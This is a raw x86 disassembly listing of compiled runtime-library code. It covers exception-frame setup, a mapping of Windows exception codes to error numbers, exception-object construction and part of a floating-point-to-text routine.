  405731:	8d 54 24 44          	lea    0x44(%esp),%edx
  405735:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  40573c:	e8 6f f9 ff ff       	call   0x4050b0
  405741:	6a 40                	push   $0x40
  405743:	8d 44 24 44          	lea    0x44(%esp),%eax
  405747:	50                   	push   %eax
  405748:	68 9f ff 00 00       	push   $0xff9f
  40574d:	a1 14 b0 40 00       	mov    0x40b014,%eax
  405752:	50                   	push   %eax
  405753:	e8 f4 ed ff ff       	call   0x40454c
  405758:	80 3d 31 b0 40 00 00 	cmpb   $0x0,0x40b031
  40575f:	74 1d                	je     0x40577e
  405761:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  405768:	b8 04 b2 40 00       	mov    $0x40b204,%eax
  40576d:	e8 72 e8 ff ff       	call   0x403fe4
  405772:	e8 f0 e7 ff ff       	call   0x403f67
  405777:	e8 d8 ce ff ff       	call   0x402654
  40577c:	eb 19                	jmp    0x405797
  40577e:	68 10 20 00 00       	push   $0x2010
  405783:	8d 44 24 44          	lea    0x44(%esp),%eax
  405787:	50                   	push   %eax
  405788:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  40578f:	50                   	push   %eax
  405790:	6a 00                	push   $0x0
  405792:	e8 bd ed ff ff       	call   0x404554
  405797:	81 c4 a8 02 00 00    	add    $0x2a8,%esp
  40579d:	5d                   	pop    %ebp
  40579e:	5f                   	pop    %edi
  40579f:	5e                   	pop    %esi
  4057a0:	5b                   	pop    %ebx
  4057a1:	c3                   	ret
  4057a2:	00 00                	add    %al,(%eax)
  4057a4:	00 00                	add    %al,(%eax)
  4057a6:	00 00                	add    %al,(%eax)
  4057a8:	2e 00 00             	add    %al,%cs:(%eax)
  4057ab:	00 8b 44 24 04 c3    	add    %cl,-0x3cfbdbbc(%ebx)
  4057b1:	8d 40 00             	lea    0x0(%eax),%eax
  4057b4:	e8 f3 ff ff ff       	call   0x4057ac
  4057b9:	50                   	push   %eax
  4057ba:	b9 9d ff 00 00       	mov    $0xff9d,%ecx
  4057bf:	b2 01                	mov    $0x1,%dl
  4057c1:	b8 00 46 40 00       	mov    $0x404600,%eax
  4057c6:	e8 c5 00 00 00       	call   0x405890
  4057cb:	e9 e4 d6 ff ff       	jmp    0x402eb4
  4057d0:	c3                   	ret
  4057d1:	8d 40 00             	lea    0x0(%eax),%eax
  4057d4:	a1 54 b5 40 00       	mov    0x40b554,%eax
  4057d9:	e8 d6 d6 ff ff       	call   0x402eb4
  4057de:	c3                   	ret
  4057df:	90                   	nop
  4057e0:	53                   	push   %ebx
  4057e1:	56                   	push   %esi
  4057e2:	57                   	push   %edi
  4057e3:	84 d2                	test   %dl,%dl
  4057e5:	74 08                	je     0x4057ef
  4057e7:	83 c4 f0             	add    $0xfffffff0,%esp
  4057ea:	e8 d9 d2 ff ff       	call   0x402ac8
  4057ef:	8b f1                	mov    %ecx,%esi
  4057f1:	8b da                	mov    %edx,%ebx
  4057f3:	8b f8                	mov    %eax,%edi
  4057f5:	8d 47 04             	lea    0x4(%edi),%eax
  4057f8:	8b d6                	mov    %esi,%edx
  4057fa:	e8 e9 d9 ff ff       	call   0x4031e8
  4057ff:	84 db                	test   %bl,%bl
  405801:	74 0a                	je     0x40580d
  405803:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40580a:	83 c4 0c             	add    $0xc,%esp
  40580d:	8b c7                	mov    %edi,%eax
  40580f:	5f                   	pop    %edi
  405810:	5e                   	pop    %esi
  405811:	5b                   	pop    %ebx
  405812:	c3                   	ret
  405813:	90                   	nop
  405814:	55                   	push   %ebp
  405815:	8b ec                	mov    %esp,%ebp
  405817:	6a 00                	push   $0x0
  405819:	53                   	push   %ebx
  40581a:	56                   	push   %esi
  40581b:	57                   	push   %edi
  40581c:	84 d2                	test   %dl,%dl
  40581e:	74 08                	je     0x405828
  405820:	83 c4 f0             	add    $0xfffffff0,%esp
  405823:	e8 a0 d2 ff ff       	call   0x402ac8
  405828:	8b f1                	mov    %ecx,%esi
  40582a:	8b da                	mov    %edx,%ebx
  40582c:	8b f8                	mov    %eax,%edi
  40582e:	33 c0                	xor    %eax,%eax
  405830:	55                   	push   %ebp
  405831:	68 6e 58 40 00       	push   $0x40586e
  405836:	64 ff 30             	push   %fs:(%eax)
  405839:	64 89 20             	mov    %esp,%fs:(%eax)
  40583c:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40583f:	50                   	push   %eax
  405840:	8b 55 0c             	mov    0xc(%ebp),%edx
  405843:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405846:	8b c6                	mov    %esi,%eax
  405848:	e8 97 f8 ff ff       	call   0x4050e4
  40584d:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405850:	8d 47 04             	lea    0x4(%edi),%eax
  405853:	e8 90 d9 ff ff       	call   0x4031e8
  405858:	33 c0                	xor    %eax,%eax
  40585a:	5a                   	pop    %edx
  40585b:	59                   	pop    %ecx
  40585c:	59                   	pop    %ecx
  40585d:	64 89 10             	mov    %edx,%fs:(%eax)
  405860:	68 75 58 40 00       	push   $0x405875
  405865:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405868:	e8 2b d9 ff ff       	call   0x403198
  40586d:	c3                   	ret
  40586e:	e9 89 d5 ff ff       	jmp    0x402dfc
  405873:	eb f0                	jmp    0x405865
  405875:	84 db                	test   %bl,%bl
  405877:	74 0a                	je     0x405883
  405879:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  405880:	83 c4 0c             	add    $0xc,%esp
  405883:	8b c7                	mov    %edi,%eax
  405885:	5f                   	pop    %edi
  405886:	5e                   	pop    %esi
  405887:	5b                   	pop    %ebx
  405888:	59                   	pop    %ecx
  405889:	5d                   	pop    %ebp
  40588a:	c2 08 00             	ret    $0x8
  40588d:	8d 40 00             	lea    0x0(%eax),%eax
  405890:	55                   	push   %ebp
  405891:	8b ec                	mov    %esp,%ebp
  405893:	6a 00                	push   $0x0
  405895:	53                   	push   %ebx
  405896:	56                   	push   %esi
  405897:	57                   	push   %edi
  405898:	84 d2                	test   %dl,%dl
  40589a:	74 08                	je     0x4058a4
  40589c:	83 c4 f0             	add    $0xfffffff0,%esp
  40589f:	e8 24 d2 ff ff       	call   0x402ac8
  4058a4:	8b f1                	mov    %ecx,%esi
  4058a6:	8b da                	mov    %edx,%ebx
  4058a8:	8b f8                	mov    %eax,%edi
  4058aa:	33 c0                	xor    %eax,%eax
  4058ac:	55                   	push   %ebp
  4058ad:	68 e3 58 40 00       	push   $0x4058e3
  4058b2:	64 ff 30             	push   %fs:(%eax)
  4058b5:	64 89 20             	mov    %esp,%fs:(%eax)
  4058b8:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4058bb:	8b c6                	mov    %esi,%eax
  4058bd:	e8 6a f3 ff ff       	call   0x404c2c
  4058c2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4058c5:	8d 47 04             	lea    0x4(%edi),%eax
  4058c8:	e8 1b d9 ff ff       	call   0x4031e8
  4058cd:	33 c0                	xor    %eax,%eax
  4058cf:	5a                   	pop    %edx
  4058d0:	59                   	pop    %ecx
  4058d1:	59                   	pop    %ecx
  4058d2:	64 89 10             	mov    %edx,%fs:(%eax)
  4058d5:	68 ea 58 40 00       	push   $0x4058ea
  4058da:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4058dd:	e8 b6 d8 ff ff       	call   0x403198
  4058e2:	c3                   	ret
  4058e3:	e9 14 d5 ff ff       	jmp    0x402dfc
  4058e8:	eb f0                	jmp    0x4058da
  4058ea:	84 db                	test   %bl,%bl
  4058ec:	74 0a                	je     0x4058f8
  4058ee:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  4058f5:	83 c4 0c             	add    $0xc,%esp
  4058f8:	8b c7                	mov    %edi,%eax
  4058fa:	5f                   	pop    %edi
  4058fb:	5e                   	pop    %esi
  4058fc:	5b                   	pop    %ebx
  4058fd:	59                   	pop    %ecx
  4058fe:	5d                   	pop    %ebp
  4058ff:	c3                   	ret
  405900:	55                   	push   %ebp
  405901:	8b ec                	mov    %esp,%ebp
  405903:	6a 00                	push   $0x0
  405905:	6a 00                	push   $0x0
  405907:	53                   	push   %ebx
  405908:	56                   	push   %esi
  405909:	57                   	push   %edi
  40590a:	84 d2                	test   %dl,%dl
  40590c:	74 08                	je     0x405916
  40590e:	83 c4 f0             	add    $0xfffffff0,%esp
  405911:	e8 b2 d1 ff ff       	call   0x402ac8
  405916:	8b f1                	mov    %ecx,%esi
  405918:	8b da                	mov    %edx,%ebx
  40591a:	8b f8                	mov    %eax,%edi
  40591c:	33 c0                	xor    %eax,%eax
  40591e:	55                   	push   %ebp
  40591f:	68 6c 59 40 00       	push   $0x40596c
  405924:	64 ff 30             	push   %fs:(%eax)
  405927:	64 89 20             	mov    %esp,%fs:(%eax)
  40592a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40592d:	50                   	push   %eax
  40592e:	8d 55 f8             	lea    -0x8(%ebp),%edx
  405931:	8b c6                	mov    %esi,%eax
  405933:	e8 f4 f2 ff ff       	call   0x404c2c
  405938:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40593b:	8b 55 0c             	mov    0xc(%ebp),%edx
  40593e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405941:	e8 9e f7 ff ff       	call   0x4050e4
  405946:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405949:	8d 47 04             	lea    0x4(%edi),%eax
  40594c:	e8 97 d8 ff ff       	call   0x4031e8
  405951:	33 c0                	xor    %eax,%eax
  405953:	5a                   	pop    %edx
  405954:	59                   	pop    %ecx
  405955:	59                   	pop    %ecx
  405956:	64 89 10             	mov    %edx,%fs:(%eax)
  405959:	68 73 59 40 00       	push   $0x405973
  40595e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405961:	ba 02 00 00 00       	mov    $0x2,%edx
  405966:	e8 4d d8 ff ff       	call   0x4031b8
  40596b:	c3                   	ret
  40596c:	e9 8b d4 ff ff       	jmp    0x402dfc
  405971:	eb eb                	jmp    0x40595e
  405973:	84 db                	test   %bl,%bl
  405975:	74 0a                	je     0x405981
  405977:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40597e:	83 c4 0c             	add    $0xc,%esp
  405981:	8b c7                	mov    %edi,%eax
  405983:	5f                   	pop    %edi
  405984:	5e                   	pop    %esi
  405985:	5b                   	pop    %ebx
  405986:	59                   	pop    %ecx
  405987:	59                   	pop    %ecx
  405988:	5d                   	pop    %ebp
  405989:	c2 08 00             	ret    $0x8
  40598c:	84 d2                	test   %dl,%dl
  40598e:	74 05                	je     0x405995
  405990:	e8 6f d1 ff ff       	call   0x402b04
  405995:	c3                   	ret
  405996:	8b c0                	mov    %eax,%eax
  405998:	c3                   	ret
  405999:	8d 40 00             	lea    0x0(%eax),%eax
  40599c:	53                   	push   %ebx
  40599d:	83 c4 f8             	add    $0xfffffff8,%esp
  4059a0:	33 db                	xor    %ebx,%ebx
  4059a2:	eb 01                	jmp    0x4059a5
  4059a4:	43                   	inc    %ebx
  4059a5:	83 fb 06             	cmp    $0x6,%ebx
  4059a8:	7f 14                	jg     0x4059be
  4059aa:	e8 a5 d7 ff ff       	call   0x403154
  4059af:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  4059b5:	3b 04 dd 80 a0 40 00 	cmp    0x40a080(,%ebx,8),%eax
  4059bc:	75 e6                	jne    0x4059a4
  4059be:	83 fb 06             	cmp    $0x6,%ebx
  4059c1:	7f 17                	jg     0x4059da
  4059c3:	8b 0c dd 84 a0 40 00 	mov    0x40a084(,%ebx,8),%ecx
  4059ca:	b2 01                	mov    $0x1,%dl
  4059cc:	b8 80 46 40 00       	mov    $0x404680,%eax
  4059d1:	e8 ba fe ff ff       	call   0x405890
  4059d6:	8b d8                	mov    %eax,%ebx
  4059d8:	eb 29                	jmp    0x405a03
  4059da:	e8 75 d7 ff ff       	call   0x403154
  4059df:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  4059e5:	89 04 24             	mov    %eax,(%esp)
  4059e8:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  4059ed:	54                   	push   %esp
  4059ee:	6a 00                	push   $0x0
  4059f0:	b9 88 ff 00 00       	mov    $0xff88,%ecx
  4059f5:	b2 01                	mov    $0x1,%dl
  4059f7:	b8 80 46 40 00       	mov    $0x404680,%eax
  4059fc:	e8 ff fe ff ff       	call   0x405900
  405a01:	8b d8                	mov    %eax,%ebx
  405a03:	e8 4c d7 ff ff       	call   0x403154
  405a08:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  405a0e:	89 43 0c             	mov    %eax,0xc(%ebx)
  405a11:	e8 3e d7 ff ff       	call   0x403154
  405a16:	33 d2                	xor    %edx,%edx
  405a18:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  405a1e:	8b c3                	mov    %ebx,%eax
  405a20:	59                   	pop    %ecx
  405a21:	5a                   	pop    %edx
  405a22:	5b                   	pop    %ebx
  405a23:	c3                   	ret
  405a24:	53                   	push   %ebx
  405a25:	8b da                	mov    %edx,%ebx
  405a27:	8b d0                	mov    %eax,%edx
  405a29:	4a                   	dec    %edx
  405a2a:	74 08                	je     0x405a34
  405a2c:	4a                   	dec    %edx
  405a2d:	83 ea 13             	sub    $0x13,%edx
  405a30:	72 09                	jb     0x405a3b
  405a32:	eb 1c                	jmp    0x405a50
  405a34:	a1 54 b5 40 00       	mov    0x40b554,%eax
  405a39:	eb 1a                	jmp    0x405a55
  405a3b:	8d 04 c5 a8 a0 40 00 	lea    0x40a0a8(,%eax,8),%eax
  405a42:	8b 48 04             	mov    0x4(%eax),%ecx
  405a45:	b2 01                	mov    $0x1,%dl
  405a47:	8b 00                	mov    (%eax),%eax
  405a49:	e8 42 fe ff ff       	call   0x405890
  405a4e:	eb 05                	jmp    0x405a55
  405a50:	e8 47 ff ff ff       	call   0x40599c
  405a55:	53                   	push   %ebx
  405a56:	e9 59 d4 ff ff       	jmp    0x402eb4
  405a5b:	5b                   	pop    %ebx
  405a5c:	c3                   	ret
  405a5d:	8d 40 00             	lea    0x0(%eax),%eax
  405a60:	8b 00                	mov    (%eax),%eax
  405a62:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  405a67:	7f 2c                	jg     0x405a95
  405a69:	74 59                	je     0x405ac4
  405a6b:	3d 8e 00 00 c0       	cmp    $0xc000008e,%eax
  405a70:	7f 15                	jg     0x405a87
  405a72:	74 53                	je     0x405ac7
  405a74:	2d 05 00 00 c0       	sub    $0xc0000005,%eax
  405a79:	74 55                	je     0x405ad0
  405a7b:	2d 87 00 00 00       	sub    $0x87,%eax
  405a80:	74 3c                	je     0x405abe
  405a82:	48                   	dec    %eax
  405a83:	74 48                	je     0x405acd
  405a85:	eb 55                	jmp    0x405adc
  405a87:	05 71 ff ff 3f       	add    $0x3fffff71,%eax
  405a8c:	83 e8 02             	sub    $0x2,%eax
  405a8f:	72 33                	jb     0x405ac4
  405a91:	74 37                	je     0x405aca
  405a93:	eb 47                	jmp    0x405adc
  405a95:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  405a9a:	7f 11                	jg     0x405aad
  405a9c:	74 35                	je     0x405ad3
  405a9e:	2d 93 00 00 c0       	sub    $0xc0000093,%eax
  405aa3:	74 28                	je     0x405acd
  405aa5:	48                   	dec    %eax
  405aa6:	74 13                	je     0x405abb
  405aa8:	48                   	dec    %eax
  405aa9:	74 16                	je     0x405ac1
  405aab:	eb 2f                	jmp    0x405adc
  405aad:	2d fd 00 00 c0       	sub    $0xc00000fd,%eax
  405ab2:	74 25                	je     0x405ad9
  405ab4:	83 e8 3d             	sub    $0x3d,%eax
  405ab7:	74 1d                	je     0x405ad6
  405ab9:	eb 21                	jmp    0x405adc
  405abb:	b0 03                	mov    $0x3,%al
  405abd:	c3                   	ret
  405abe:	b0 04                	mov    $0x4,%al
  405ac0:	c3                   	ret
  405ac1:	b0 05                	mov    $0x5,%al
  405ac3:	c3                   	ret
  405ac4:	b0 06                	mov    $0x6,%al
  405ac6:	c3                   	ret
  405ac7:	b0 07                	mov    $0x7,%al
  405ac9:	c3                   	ret
  405aca:	b0 08                	mov    $0x8,%al
  405acc:	c3                   	ret
  405acd:	b0 09                	mov    $0x9,%al
  405acf:	c3                   	ret
  405ad0:	b0 0b                	mov    $0xb,%al
  405ad2:	c3                   	ret
  405ad3:	b0 0c                	mov    $0xc,%al
  405ad5:	c3                   	ret
  405ad6:	b0 0d                	mov    $0xd,%al
  405ad8:	c3                   	ret
  405ad9:	b0 0e                	mov    $0xe,%al
  405adb:	c3                   	ret
  405adc:	b0 15                	mov    $0x15,%al
  405ade:	c3                   	ret
  405adf:	90                   	nop
  405ae0:	e8 7b ff ff ff       	call   0x405a60
  405ae5:	25 ff 00 00 00       	and    $0xff,%eax
  405aea:	8b 04 c5 a8 a0 40 00 	mov    0x40a0a8(,%eax,8),%eax
  405af1:	c3                   	ret
  405af2:	8b c0                	mov    %eax,%eax
  405af4:	55                   	push   %ebp
  405af5:	8b ec                	mov    %esp,%ebp
  405af7:	83 c4 dc             	add    $0xffffffdc,%esp
  405afa:	53                   	push   %ebx
  405afb:	56                   	push   %esi
  405afc:	57                   	push   %edi
  405afd:	33 d2                	xor    %edx,%edx
  405aff:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  405b02:	8b d8                	mov    %eax,%ebx
  405b04:	33 c0                	xor    %eax,%eax
  405b06:	55                   	push   %ebp
  405b07:	68 d7 5b 40 00       	push   $0x405bd7
  405b0c:	64 ff 30             	push   %fs:(%eax)
  405b0f:	64 89 20             	mov    %esp,%fs:(%eax)
  405b12:	8b c3                	mov    %ebx,%eax
  405b14:	e8 47 ff ff ff       	call   0x405a60
  405b19:	25 ff 00 00 00       	and    $0xff,%eax
  405b1e:	8b d0                	mov    %eax,%edx
  405b20:	83 c2 fd             	add    $0xfffffffd,%edx
  405b23:	83 ea 08             	sub    $0x8,%edx
  405b26:	72 08                	jb     0x405b30
  405b28:	74 1d                	je     0x405b47
  405b2a:	4a                   	dec    %edx
  405b2b:	83 ea 09             	sub    $0x9,%edx
  405b2e:	73 6c                	jae    0x405b9c
  405b30:	8d 04 c5 a8 a0 40 00 	lea    0x40a0a8(,%eax,8),%eax
  405b37:	8b 48 04             	mov    0x4(%eax),%ecx
  405b3a:	8b 00                	mov    (%eax),%eax
  405b3c:	b2 01                	mov    $0x1,%dl
  405b3e:	e8 4d fd ff ff       	call   0x405890
  405b43:	8b f0                	mov    %eax,%esi
  405b45:	eb 7a                	jmp    0x405bc1
  405b47:	83 7b 14 00          	cmpl   $0x0,0x14(%ebx)
  405b4b:	75 07                	jne    0x405b54
  405b4d:	be a5 ff 00 00       	mov    $0xffa5,%esi
  405b52:	eb 05                	jmp    0x405b59
  405b54:	be a6 ff 00 00       	mov    $0xffa6,%esi
  405b59:	8b 7b 18             	mov    0x18(%ebx),%edi
  405b5c:	8b 43 0c             	mov    0xc(%ebx),%eax
  405b5f:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405b62:	c6 45 ec 05          	movb   $0x5,-0x14(%ebp)
  405b66:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  405b69:	8b c6                	mov    %esi,%eax
  405b6b:	e8 bc f0 ff ff       	call   0x404c2c
  405b70:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405b73:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405b76:	c6 45 f4 0b          	movb   $0xb,-0xc(%ebp)
  405b7a:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405b7d:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  405b81:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405b84:	50                   	push   %eax
  405b85:	6a 02                	push   $0x2
  405b87:	b9 99 ff 00 00       	mov    $0xff99,%ecx
  405b8c:	b2 01                	mov    $0x1,%dl
  405b8e:	b8 d0 49 40 00       	mov    $0x4049d0,%eax
  405b93:	e8 68 fd ff ff       	call   0x405900
  405b98:	8b f0                	mov    %eax,%esi
  405b9a:	eb 25                	jmp    0x405bc1
  405b9c:	8b 03                	mov    (%ebx),%eax
  405b9e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  405ba1:	c6 45 e0 00          	movb   $0x0,-0x20(%ebp)
  405ba5:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405ba8:	50                   	push   %eax
  405ba9:	6a 00                	push   $0x0
  405bab:	b9 ac ff 00 00       	mov    $0xffac,%ecx
  405bb0:	b2 01                	mov    $0x1,%dl
  405bb2:	b8 20 4b 40 00       	mov    $0x404b20,%eax
  405bb7:	e8 44 fd ff ff       	call   0x405900
  405bbc:	8b f0                	mov    %eax,%esi
  405bbe:	89 5e 0c             	mov    %ebx,0xc(%esi)
  405bc1:	33 c0                	xor    %eax,%eax
  405bc3:	5a                   	pop    %edx
  405bc4:	59                   	pop    %ecx
  405bc5:	59                   	pop    %ecx
  405bc6:	64 89 10             	mov    %edx,%fs:(%eax)
  405bc9:	68 de 5b 40 00       	push   $0x405bde
  405bce:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405bd1:	e8 c2 d5 ff ff       	call   0x403198
  405bd6:	c3                   	ret
  405bd7:	e9 20 d2 ff ff       	jmp    0x402dfc
  405bdc:	eb f0                	jmp    0x405bce
  405bde:	8b c6                	mov    %esi,%eax
  405be0:	5f                   	pop    %edi
  405be1:	5e                   	pop    %esi
  405be2:	5b                   	pop    %ebx
  405be3:	8b e5                	mov    %ebp,%esp
  405be5:	5d                   	pop    %ebp
  405be6:	c3                   	ret
  405be7:	90                   	nop
  405be8:	e8 3b fa ff ff       	call   0x405628
  405bed:	b8 01 00 00 00       	mov    $0x1,%eax
  405bf2:	e8 39 e2 ff ff       	call   0x403e30
  405bf7:	c3                   	ret
  405bf8:	b9 87 ff 00 00       	mov    $0xff87,%ecx
  405bfd:	b2 01                	mov    $0x1,%dl
  405bff:	b8 3c 46 40 00       	mov    $0x40463c,%eax
  405c04:	e8 87 fc ff ff       	call   0x405890
  405c09:	a3 54 b5 40 00       	mov    %eax,0x40b554
  405c0e:	c7 05 04 b0 40 00 24 	movl   $0x405a24,0x40b004
  405c15:	5a 40 00 
  405c18:	c7 05 00 b0 40 00 e8 	movl   $0x405be8,0x40b000
  405c1f:	5b 40 00 
  405c22:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  405c27:	a3 10 b0 40 00       	mov    %eax,0x40b010
  405c2c:	c7 05 08 b0 40 00 e0 	movl   $0x405ae0,0x40b008
  405c33:	5a 40 00 
  405c36:	c7 05 0c b0 40 00 f4 	movl   $0x405af4,0x40b00c
  405c3d:	5a 40 00 
  405c40:	c3                   	ret
  405c41:	8d 40 00             	lea    0x0(%eax),%eax
  405c44:	81 c4 6c ff ff ff    	add    $0xffffff6c,%esp
  405c4a:	c7 04 24 94 00 00 00 	movl   $0x94,(%esp)
  405c51:	54                   	push   %esp
  405c52:	e8 2d e8 ff ff       	call   0x404484
  405c57:	85 c0                	test   %eax,%eax
  405c59:	74 09                	je     0x405c64
  405c5b:	8b 44 24 10          	mov    0x10(%esp),%eax
  405c5f:	a3 7c a0 40 00       	mov    %eax,0x40a07c
  405c64:	81 c4 94 00 00 00    	add    $0x94,%esp
  405c6a:	c3                   	ret
  405c6b:	90                   	nop
  405c6c:	0a 00                	or     (%eax),%al
  405c6e:	00 00                	add    %al,(%eax)
  405c70:	64 00 00             	add    %al,%fs:(%eax)
  405c73:	00 e8                	add    %ch,%al
  405c75:	03 00                	add    (%eax),%eax
  405c77:	00 10                	add    %dl,(%eax)
  405c79:	27                   	daa
  405c7a:	00 00                	add    %al,(%eax)
  405c7c:	00 00                	add    %al,(%eax)
  405c7e:	40                   	inc    %eax
  405c7f:	76 3a                	jbe    0x405cbb
  405c81:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  405c84:	3a 40 3f             	cmp    0x3f(%eax),%al
  405c87:	13 49 4e             	adc    0x4e(%ecx),%ecx
  405c8a:	46                   	inc    %esi
  405c8b:	4e                   	dec    %esi
  405c8c:	41                   	inc    %ecx
  405c8d:	4e                   	dec    %esi
  405c8e:	55                   	push   %ebp
  405c8f:	8b ec                	mov    %esp,%ebp
  405c91:	83 ec 1c             	sub    $0x1c,%esp
  405c94:	57                   	push   %edi
  405c95:	56                   	push   %esi
  405c96:	53                   	push   %ebx
  405c97:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c9a:	b8 13 00 00 00       	mov    $0x13,%eax
  405c9f:	80 f9 00             	cmp    $0x0,%cl
  405ca2:	75 17                	jne    0x405cbb
  405ca4:	8b 45 0c             	mov    0xc(%ebp),%eax
  405ca7:	83 f8 02             	cmp    $0x2,%eax
  405caa:	7d 05                	jge    0x405cb1
  405cac:	b8 02 00 00 00       	mov    $0x2,%eax
  405cb1:	83 f8 12             	cmp    $0x12,%eax
  405cb4:	7e 05                	jle    0x405cbb
  405cb6:	b8 12 00 00 00       	mov    $0x12,%eax
  405cbb:	89 45 0c             	mov    %eax,0xc(%ebp)
  405cbe:	50                   	push   %eax
  405cbf:	b8 0f 27 00 00       	mov    $0x270f,%eax
  405cc4:	80 7d 10 02          	cmpb   $0x2,0x10(%ebp)
  405cc8:	72 03                	jb     0x405ccd
  405cca:	8b 45 08             	mov    0x8(%ebp),%eax
  405ccd:	50                   	push   %eax
  405cce:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405cd1:	e8 54 05 00 00       	call   0x40622a
  405cd6:	8b 7d fc             	mov    -0x4(%ebp),%edi
  405cd9:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  405cdd:	2d ff 7f 00 00       	sub    $0x7fff,%eax
  405ce2:	83 f8 02             	cmp    $0x2,%eax
  405ce5:	73 10                	jae    0x405cf7
  405ce7:	8d b4 40 88 5c 40 00 	lea    0x405c88(%eax,%eax,2),%esi
  405cee:	b9 03 00 00 00       	mov    $0x3,%ecx
  405cf3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405cf5:	eb 23                	jmp    0x405d1a
  405cf7:	8d 75 e7             	lea    -0x19(%ebp),%esi
  405cfa:	0f b6 5d 10          	movzbl 0x10(%ebp),%ebx
  405cfe:	80 fb 01             	cmp    $0x1,%bl
  405d01:	74 10                	je     0x405d13
  405d03:	80 fb 04             	cmp    $0x4,%bl
  405d06:	77 09                	ja     0x405d11
  405d08:	0f bf 45 e4          	movswl -0x1c(%ebp),%eax
  405d0c:	3b 45 0c             	cmp    0xc(%ebp),%eax
  405d0f:	7e 02                	jle    0x405d13
  405d11:	b3 00                	mov    $0x0,%bl
  405d13:	ff 14 9d 28 5d 40 00 	call   *0x405d28(,%ebx,4)
  405d1a:	8b c7                	mov    %edi,%eax
  405d1c:	2b 45 fc             	sub    -0x4(%ebp),%eax
  405d1f:	5b                   	pop    %ebx
  405d20:	5e                   	pop    %esi
  405d21:	5f                   	pop    %edi
  405d22:	8b e5                	mov    %ebp,%esp
  405d24:	5d                   	pop    %ebp
  405d25:	c2 0c 00             	ret    $0xc
  405d28:	4f                   	dec    %edi
  405d29:	5d                   	pop    %ebp
  405d2a:	40                   	inc    %eax
  405d2b:	00 b1 5d 40 00 24    	add    %dh,0x2400405d(%ecx)
  405d31:	5e                   	pop    %esi
  405d32:	40                   	inc    %eax
  405d33:	00 24 5e             	add    %ah,(%esi,%ebx,2)
  405d36:	40                   	inc    %eax
  405d37:	00 8a 5e 40 00 ac    	add    %cl,-0x53ffbfa2(%edx)
  405d3d:	0a c0                	or     %al,%al
  405d3f:	75 03                	jne    0x405d44
  405d41:	b0 30                	mov    $0x30,%al
  405d43:	4e                   	dec    %esi
  405d44:	c3                   	ret
  405d45:	80 7d e6 00          	cmpb   $0x0,-0x1a(%ebp)
  405d49:	74 03                	je     0x405d4e
  405d4b:	b0 2d                	mov    $0x2d,%al
  405d4d:	aa                   	stos   %al,%es:(%edi)
  405d4e:	c3                   	ret
  405d4f:	e8 f1 ff ff ff       	call   0x405d45
  405d54:	0f bf 4d e4          	movswl -0x1c(%ebp),%ecx
  405d58:	33 d2                	xor    %edx,%edx
  405d5a:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  405d5d:	7f 1f                	jg     0x405d7e
  405d5f:	83 f9 fd             	cmp    $0xfffffffd,%ecx
  405d62:	7c 1a                	jl     0x405d7e
  405d64:	0b c9                	or     %ecx,%ecx
  405d66:	7f 1c                	jg     0x405d84
  405d68:	b0 30                	mov    $0x30,%al
  405d6a:	aa                   	stos   %al,%es:(%edi)
  405d6b:	80 3e 00             	cmpb   $0x0,(%esi)
  405d6e:	74 40                	je     0x405db0
  405d70:	a0 9b b4 40 00       	mov    0x40b49b,%al
  405d75:	aa                   	stos   %al,%es:(%edi)
  405d76:	f7 d9                	neg    %ecx
  405d78:	b0 30                	mov    $0x30,%al
  405d7a:	f3 aa                	rep stos %al,%es:(%edi)
  405d7c:	eb 1c                	jmp    0x405d9a
  405d7e:	b9 01 00 00 00       	mov    $0x1,%ecx
  405d83:	42                   	inc    %edx
  405d84:	ac                   	lods   %ds:(%esi),%al
  405d85:	0a c0                	or     %al,%al
  405d87:	74 19                	je     0x405da2
  405d89:	aa                   	stos   %al,%es:(%edi)
  405d8a:	e2 f8                	loop   0x405d84
  405d8c:	ac                   	lods   %ds:(%esi),%al
  405d8d:	0a c0                	or     %al,%al
  405d8f:	74 15                	je     0x405da6
  405d91:	8a e0                	mov    %al,%ah
  405d93:	a0 9b b4 40 00       	mov    0x40b49b,%al
  405d98:	66 ab                	stos   %ax,%es:(%edi)
  405d9a:	ac                   	lods   %ds:(%esi),%al
  405d9b:	0a c0                	or     %al,%al
  405d9d:	74 07                	je     0x405da6
